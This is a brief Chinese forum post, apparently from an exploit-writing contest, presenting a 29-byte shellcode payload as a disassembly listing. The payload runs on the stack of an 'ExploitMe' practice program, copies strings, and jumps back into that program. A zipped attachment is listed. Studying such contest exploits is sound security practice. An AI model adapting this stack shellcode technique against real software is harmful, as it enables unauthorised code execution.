
# 29byte 兼容性优先无错版.

> 原文：[`www.pediy.com/kssd/pediy11/122970.html`](https://www.pediy.com/kssd/pediy11/122970.html)

```
0012FCAB    BE 6C604000          mov esi,0x40606C                                 ; UNICODE "ExploitMe"
0012FCB0    6A 00                push 0x0
0012FCB2    56                   push esi
0012FCB3    57                   push edi
0012FCB4    B9 0E000000          mov ecx,0xE
0012FCB9    F3:A4                rep movs byte ptr es:[edi],byte ptr ds:[esi]
0012FCBB    B9 10000000          mov ecx,0x10
0012FCC0    BE 22B1897C          mov esi,0x7C89B122                               ; UNICODE " successfully.
"
0012FCC5    F3:A4                rep movs byte ptr es:[edi],byte ptr ds:[esi]
0012FCC7  - E9 00152D00          jmp ExploitM.004011CC
```

估计还可以优化下。![](img/bedc2a7572d1054a9590e607b9635bdd.jpg "皱眉")

上传的附件

| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || exploit_codegame.rar |
